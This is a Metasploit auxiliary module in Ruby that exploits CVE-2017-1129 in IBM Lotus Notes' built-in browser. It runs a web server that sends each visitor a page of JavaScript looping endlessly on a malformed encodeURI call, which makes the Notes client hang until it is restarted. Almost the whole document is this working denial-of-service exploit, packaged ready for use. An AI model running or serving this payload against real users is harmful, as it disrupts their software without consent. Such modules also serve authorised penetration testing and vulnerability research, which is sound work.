##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "IBM Notes encodeURI DOS",
        'Description'    => %q(
          This module exploits a vulnerability in the native browser that comes with IBM Lotus Notes.
          If successful, it could cause the Notes client to hang and have to be restarted.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Dhiraj Mishra',
        ],
        'References'     => [
          [ 'EXPLOIT-DB', '42602'],
          [ 'CVE', '2017-1129' ],
          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21999385' ]
        ],
        'DisclosureDate' => 'Aug 31 2017',
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
    <html><head><title>DOS</title>
<script type="text/javascript">
while (true) try {
                var object = { };
                function d(d0) {
                        var d0 = (object instanceof encodeURI)('foo');
                }
                d(75);
        } catch (d) { }
</script>
</head></html>
    |
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
